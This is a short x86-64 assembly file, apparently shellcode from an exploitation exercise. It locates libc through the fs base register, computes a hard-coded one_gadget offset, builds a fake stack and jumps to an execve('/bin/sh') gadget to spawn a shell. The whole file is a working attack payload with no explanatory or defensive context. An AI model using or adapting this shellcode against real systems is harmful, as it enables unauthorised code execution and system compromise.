.global _start
_start:
.intel_syntax noprefix

        # one_gadget shell call for libc.so.6
        #int3
        mov rbx, fs:0 # fsbase isn't cleared            
        mov rcx, rbx
        add rcx, 10432 # libc base 
        mov r8, rcx
        mov rbp, rcx
        sub rbp, 0x100 # needed writable address
        xor rdi, rdi
        xor r13, r13
        add r8, 0xd636b # execve("/bin/sh", rbp-0x40, r13)
        mov rsp, rbp # make fake stack so calls like push in libc work
        jmp r8

